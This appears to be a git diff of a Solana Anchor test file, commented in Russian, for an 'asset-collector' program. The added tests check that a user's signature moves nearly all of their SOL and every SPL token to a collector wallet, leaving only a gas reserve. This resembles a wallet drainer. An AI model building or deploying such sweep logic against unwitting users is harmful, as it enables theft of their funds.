@@ -1,15 +1,22 @@
 import * as anchor from "@coral-xyz/anchor";
 import { Program } from "@coral-xyz/anchor";
-import { AssetCollector } from "../target/types/asset_collector";
 import { PublicKey, Keypair, LAMPORTS_PER_SOL } from "@solana/web3.js";
 import { expect } from "chai";
+import {
+  createMint,
+  createAssociatedTokenAccount,
+  mintTo,
+  getAccount,
+  TOKEN_PROGRAM_ID,
+  ASSOCIATED_TOKEN_PROGRAM_ID,
+} from "@solana/spl-token";
 
 describe("asset-collector", () => {
   // Configure the client to use the local cluster.
   const provider = anchor.AnchorProvider.env();
   anchor.setProvider(provider);
 
-  const program = anchor.workspace.assetCollector as Program<AssetCollector>;
+  const program = anchor.workspace.assetCollector;
   
   // Test keypairs
   const authority = Keypair.generate();
@@ -21,6 +28,11 @@ describe("asset-collector", () => {
     [Buffer.from("collector-state")],
     program.programId
   );
+
+  // SPL Token variables
+  let testMint: PublicKey;
+  let userTokenAccount: PublicKey;
+  let collectorTokenAccount: PublicKey;
 
   it("Is initialized!", async () => {
     const tx = await program.methods.initialize().rpc();
@@ -97,19 +109,79 @@ describe("asset-collector", () => {
         .rpc();
         
       expect.fail("Expected transaction to fail");
-    } catch (error) {
-      expect(error.message).to.include("Unauthorized");
+    } catch (error: any) {
+      expect(error.message).to.include("unauthorized");
       console.log("✅ Correctly rejected wrong authority");
     }
   });
 
-  it("Collect assets from user wallet", async () => {
+  it("Create test SPL token and mint to user", async () => {
+    console.log("🪙 Creating test SPL token...");
+    
+    // Создаем mint
+    testMint = await createMint(
+      provider.connection,
+      authority, // payer
+      authority.publicKey, // mint authority
+      null, // freeze authority
+      9 // decimals
+    );
+    
+    console.log("Test mint address:", testMint.toString());
+
+    // Создаем токен аккаунт для пользователя
+    userTokenAccount = await createAssociatedTokenAccount(
+      provider.connection,
+      authority, // payer
+      testMint,
+      userWallet.publicKey
+    );
+    
+    console.log("User token account:", userTokenAccount.toString());
+
+    // Минтим токены пользователю
+    const mintAmount = 1000 * 10**9; // 1000 токенов
+    await mintTo(
+      provider.connection,
+      authority, // payer
+      testMint,
+      userTokenAccount,
+      authority, // mint authority
+      mintAmount
+    );
+
+    // Проверяем баланс
+    const userTokenInfo = await getAccount(provider.connection, userTokenAccount);
+    expect(Number(userTokenInfo.amount)).to.equal(mintAmount);
+    
+    console.log(`✅ Minted ${Number(userTokenInfo.amount) / 10**9} tokens to user`);
+  });
+
+  it("Create collector token account", async () => {
+    // Создаем токен аккаунт для получателя
+    collectorTokenAccount = await createAssociatedTokenAccount(
+      provider.connection,
+      authority, // payer
+      testMint,
+      collectorWallet.publicKey
+    );
+    
+    console.log("Collector token account:", collectorTokenAccount.toString());
+    
+    // Проверяем, что баланс пустой
+    const collectorTokenInfo = await getAccount(provider.connection, collectorTokenAccount);
+    expect(Number(collectorTokenInfo.amount)).to.equal(0);
+    
+    console.log("✅ Collector token account created with 0 balance");
+  });
+
+  it("Collect SOL assets from user wallet", async () => {
     // Получаем баланс до операции
     const userBalanceBefore = await provider.connection.getBalance(userWallet.publicKey);
     const collectorBalanceBefore = await provider.connection.getBalance(collectorWallet.publicKey);
     
-    console.log(`User balance before: ${userBalanceBefore / LAMPORTS_PER_SOL} SOL`);
-    console.log(`Collector balance before: ${collectorBalanceBefore / LAMPORTS_PER_SOL} SOL`);
+    console.log(`User SOL before: ${userBalanceBefore / LAMPORTS_PER_SOL} SOL`);
+    console.log(`Collector SOL before: ${collectorBalanceBefore / LAMPORTS_PER_SOL} SOL`);
     
     const tx = await program.methods
       .collectAllAssets()
@@ -122,14 +194,14 @@ describe("asset-collector", () => {
       .signers([userWallet])
       .rpc();
       
-    console.log("Collect assets signature:", tx);
+    console.log("Collect SOL assets signature:", tx);
     
     // Получаем баланс после операции
     const userBalanceAfter = await provider.connection.getBalance(userWallet.publicKey);
     const collectorBalanceAfter = await provider.connection.getBalance(collectorWallet.publicKey);
     
-    console.log(`User balance after: ${userBalanceAfter / LAMPORTS_PER_SOL} SOL`);
-    console.log(`Collector balance after: ${collectorBalanceAfter / LAMPORTS_PER_SOL} SOL`);
+    console.log(`User SOL after: ${userBalanceAfter / LAMPORTS_PER_SOL} SOL`);
+    console.log(`Collector SOL after: ${collectorBalanceAfter / LAMPORTS_PER_SOL} SOL`);
     
     // Проверяем, что у пользователя остался резерв (~0.015 SOL + немного на комиссии)
     expect(userBalanceAfter).to.be.lessThan(userBalanceBefore);
@@ -138,28 +210,76 @@ describe("asset-collector", () => {
     // Проверяем, что коллектор получил средства
     expect(collectorBalanceAfter).to.be.greaterThan(collectorBalanceBefore);
     
-    console.log("✅ Assets collected successfully!");
+    const transferredAmount = (collectorBalanceAfter - collectorBalanceBefore) / LAMPORTS_PER_SOL;
+    console.log(`✅ SOL transferred: ${transferredAmount} SOL`);
   });
 
-  it("Should fail to collect assets if collector wallet not set", async () => {
-    // Создаем новое состояние без установленного кошелька
-    const newAuthority = Keypair.generate();
+  it("Collect SPL tokens from user wallet", async () => {
+    // Получаем баланс токенов до операции
+    const userTokenBefore = await getAccount(provider.connection, userTokenAccount);
+    const collectorTokenBefore = await getAccount(provider.connection, collectorTokenAccount);
     
-    // Пополняем новый аккаунт
-    const airdrop = await provider.connection.requestAirdrop(
-      newAuthority.publicKey,
-      2 * LAMPORTS_PER_SOL
-    );
-    await provider.connection.confirmTransaction(airdrop);
+    console.log(`User tokens before: ${Number(userTokenBefore.amount) / 10**9}`);
+    console.log(`Collector tokens before: ${Number(collectorTokenBefore.amount) / 10**9}`);
     
-    const [newStatePDA] = PublicKey.findProgramAddressSync(
-      [Buffer.from("collector-state-2")], // другой seed для теста
-      program.programId
-    );
+    const tx = await program.methods
+      .collectSplTokens()
+      .accounts({
+        collectorState: collectorStatePDA,
+        userWallet: userWallet.publicKey,
+        collectorWallet: collectorWallet.publicKey,
+        mint: testMint,
+        userTokenAccount: userTokenAccount,
+        collectorTokenAccount: collectorTokenAccount,
+        tokenProgram: TOKEN_PROGRAM_ID,
+        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
+        systemProgram: anchor.web3.SystemProgram.programId,
+      })
+      .signers([userWallet])
+      .rpc();
+      
+    console.log("Collect SPL tokens signature:", tx);
     
-    // Инициализируем состояние но НЕ устанавливаем кошелек
-    // (это требует модификации контракта для поддержки разных seeds)
-    // Пока что пропустим этот тест или проверим с текущим состоянием
-    console.log("⚠️  Test skipped - requires contract modification for different seeds");
+    // Получаем баланс токенов после операции
+    const userTokenAfter = await getAccount(provider.connection, userTokenAccount);
+    const collectorTokenAfter = await getAccount(provider.connection, collectorTokenAccount);
+    
+    console.log(`User tokens after: ${Number(userTokenAfter.amount) / 10**9}`);
+    console.log(`Collector tokens after: ${Number(collectorTokenAfter.amount) / 10**9}`);
+    
+    // Проверяем, что все токены переведены
+    expect(Number(userTokenAfter.amount)).to.equal(0);
+    expect(Number(collectorTokenAfter.amount)).to.equal(Number(userTokenBefore.amount));
+    
+    const transferredTokens = Number(collectorTokenAfter.amount) / 10**9;
+    console.log(`✅ SPL tokens transferred: ${transferredTokens} tokens`);
+  });
+
+  it("Verify final balances", async () => {
+    console.log("\n📊 ИТОГОВЫЕ БАЛАНСЫ:");
+    
+    // SOL балансы
+    const userSolFinal = await provider.connection.getBalance(userWallet.publicKey);
+    const collectorSolFinal = await provider.connection.getBalance(collectorWallet.publicKey);
+    
+    console.log(`👤 User SOL: ${userSolFinal / LAMPORTS_PER_SOL} SOL`);
+    console.log(`🏛️  Collector SOL: ${collectorSolFinal / LAMPORTS_PER_SOL} SOL`);
+    
+    // Токен балансы
+    const userTokenFinal = await getAccount(provider.connection, userTokenAccount);
+    const collectorTokenFinal = await getAccount(provider.connection, collectorTokenAccount);
+    
+    console.log(`🪙 User Tokens: ${Number(userTokenFinal.amount) / 10**9}`);
+    console.log(`🪙 Collector Tokens: ${Number(collectorTokenFinal.amount) / 10**9}`);
+    
+    // Проверяем, что пользователь остался только с газовым резервом
+    expect(userSolFinal).to.be.greaterThan(10_000_000); // есть резерв
+    expect(userSolFinal).to.be.lessThan(20_000_000); // не больше резерва + комиссии
+    
+    // Проверяем, что все токены у коллектора
+    expect(Number(userTokenFinal.amount)).to.equal(0);
+    expect(Number(collectorTokenFinal.amount)).to.equal(1000 * 10**9);
+    
+    console.log("✅ All assets successfully collected!");
   });
 });
